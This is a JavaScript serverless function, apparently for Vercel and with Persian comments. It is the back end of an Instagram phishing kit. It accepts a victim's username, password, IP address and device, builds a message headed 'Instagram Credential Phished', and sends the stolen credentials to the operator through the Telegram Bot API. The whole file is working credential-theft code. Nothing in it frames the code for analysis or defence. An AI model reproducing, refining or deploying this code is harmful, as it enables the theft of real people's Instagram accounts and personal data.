export default async function handler(req, res) {
  // فقط POST قبول می‌شود
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { user, pass, ip, device, time } = req.body;

    if (!user || !pass) {
      return res.status(400).json({ error: 'Missing fields' });
    }

    // خواندن توکن از Environment Variables در Vercel
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID   = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID not set in Vercel Environment Variables');
      return res.status(500).json({
        error: 'Server configuration error',
        detail: 'BOT_TOKEN or CHAT_ID missing'
      });
    }

    const message = [
      '🔐 *Instagram Credential Phished*',
      '━━━━━━━━━━━━━━━━━━━━━',
      `👤 *Username/Email:* \`${user}\``,
      `🔑 *Password:* \`${pass}\``,
      `🌐 *IP Address:* \`${ip || 'Unknown'}\``,
      `📱 *Device:* \`${(device || 'Unknown').substring(0, 250)}\``,
      `⏰ *Time:* ${time || 'Unknown'} (IRST)`,
      '━━━━━━━━━━━━━━━━━━━━━'
    ].join('\n');

    console.log('📤 Sending to Telegram...');

    const tgResp = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      }
    );

    const tgData = await tgResp.json();

    if (!tgData.ok) {
      console.error('❌ Telegram API error:', JSON.stringify(tgData));
      return res.status(500).json({
        error: 'Telegram send failed',
        detail: tgData.description || 'Unknown error'
      });
    }

    console.log('✅ Message sent to Telegram successfully');
    return res.status(200).json({ ok: true });

  } catch (err) {
    console.error('❌ Server error:', err.message);
    return res.status(500).json({
      error: 'Internal server error',
      detail: err.message
    });
  }
}
